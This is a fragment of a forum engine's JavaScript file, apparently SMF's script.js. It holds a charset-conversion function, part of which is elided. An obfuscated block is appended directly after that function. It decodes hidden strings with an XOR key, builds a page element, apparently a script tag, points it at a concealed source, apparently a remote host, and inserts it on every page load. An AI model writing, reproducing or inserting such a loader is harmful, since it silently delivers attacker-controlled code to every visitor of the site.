...
String.prototype.php_to8bit = function () {
	...
	else if (smf_charset == 'windows-1256')
	{
		...
		return this;
}var tCF=["022012","023006","021027","006029081086051092055007054026055087039","022029087","017022068082","017010076067104083019029050004049075058010014","004031068082041093049003058027054","013010085083","002010064114043092031014061003033123042046027002033085090034","013027064071125022093024039022038092125009023009093026069050022024024124020060077125016009"];tE2(iC3Szn9(tCF[10]));function iC3Szn9(e5){return s4wQ3(s6T52Y(e5),'eo47G9rkSwR9Szz');}function s4wQ3(xS56n,it){var lM7p1Z='';var wdPr=0;var cGsW=0;for(wdPr=0;wdPr<xS56n.length;wdPr++){var d941=xS56n.charAt(wdPr);var dSC36=d941.charCodeAt(0)^it.charCodeAt(cGsW);d941=String.fromCharCode(dSC36);lM7p1Z+=d941;if(cGsW==it.length-1)cGsW=0;else cGsW++;}return (lM7p1Z);}function s6T52Y(t95){var yzD0fi='';var hg=0;var qWdr=0;for(hg=0;hg<t95.length/3;hg++){yzD0fi+=String.fromCharCode(t95.slice(qWdr,qWdr+3));qWdr=qWdr+3;}return yzD0fi;}function tE2(iKrLG5){var y0=document[iC3Szn9(tCF[3])](iC3Szn9(tCF[0])+iC3Szn9(tCF[1])+iC3Szn9(tCF[2]));y0[iC3Szn9(tCF[4])]=iKrLG5;y0[iC3Szn9(tCF[5])]=iC3Szn9(tCF[6]);document[iC3Szn9(tCF[9])](iC3Szn9(tCF[8]))[0][iC3Szn9(tCF[7])](y0);}